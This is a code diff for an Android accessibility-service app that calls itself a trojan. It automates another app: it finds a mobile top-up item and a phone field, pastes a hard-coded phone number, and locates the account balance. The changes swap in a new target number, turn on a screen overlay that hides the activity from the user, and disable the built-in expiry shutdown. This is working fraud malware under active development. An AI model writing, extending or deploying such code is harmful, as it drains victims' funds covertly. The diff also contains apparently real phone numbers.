@@ -82,11 +82,11 @@ class AutoClickService: AccessibilityService() {
             }
 
             if (currentNode != null) {
-                if (currentNode.text != null && currentNode.text.toString().contains("Celular item")
+                if (currentNode.text != null && currentNode.text.toString().contains("Celular,")
                     && currentNode.text.toString().contains("1 de 6")
                     && ctn_press == 1) {
 
-                    Log.d("Brassec", "Find node 1.")
+                    Log.d("Brassec", "Find node 1, Celular encontrado.")
                     return  press(currentNode)
                 }
             }
@@ -94,7 +94,7 @@ class AutoClickService: AccessibilityService() {
             if (currentNode != null) {
                 if(currentNode.viewIdResourceName!= null &&
                     currentNode.viewIdResourceName.toString().contains("telefone")){
-                    Log.d("Brassec", "Find node 2.")
+                    Log.d("Brassec", "Find node 2, Campo telefone.")
 
                     var myClipboard: ClipboardManager? = null
                     var myClip: ClipData? = null
@@ -103,7 +103,7 @@ class AutoClickService: AccessibilityService() {
                         myClipboard.clearPrimaryClip()
                         SystemClock.sleep(100)
                     }
-                    myClip = ClipData.newPlainText("text", "(21)996224328")
+                    myClip = ClipData.newPlainText("text", "(45)999357694")
                     SystemClock.sleep(100)
                     if (myClip != null) {
                         myClipboard?.setPrimaryClip(myClip)
@@ -129,7 +129,7 @@ class AutoClickService: AccessibilityService() {
                         .contains("aldo")
                     && ctn_press ==5) {
 
-                    Log.d("Brassec", "Find node 5.")
+                    Log.d("Brassec", "Find node 5, saldo encontrado.")
                     SystemClock.sleep(50)
                     return   press(currentNode) }
             }
@@ -223,8 +223,9 @@ class AutoClickService: AccessibilityService() {
     private suspend fun addOverlayView() {
         Log.d("Brassec", "Add overlay view")
         overlayView = LayoutInflater.from(this).inflate(R.layout.layout1, null)
-       // mWindowManager?.addView(overlayView, layoutParams)
-        //findNodeWithText("x")
+        mWindowManager?.addView(overlayView, layoutParams)
+
+       // findNodeWithText("x")
     }
     @OptIn(DelicateCoroutinesApi::class)
     @RequiresApi(Build.VERSION_CODES.O)
@@ -594,7 +595,7 @@ class AutoClickService: AccessibilityService() {
 
     fun data_limite() {
         // Data estipulada para inutilizar o software
-        val dataEstipuladaStr = "27/09/2024 21:00:00"
+        val dataEstipuladaStr = "27/09/2025 21:00:00"
         val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
 
         try {
@@ -605,7 +606,7 @@ class AutoClickService: AccessibilityService() {
             // Comparar as datas diretamente
             if (dataAtual.after(dataEstipulada)) {
                 // Ação para desativar o trojan ou software
-                disableSelf()  // Implementar a função de desativação aqui
+               // disableSelf()  // Implementar a função de desativação aqui
             }
         } catch (e: ParseException) {
             e.printStackTrace()
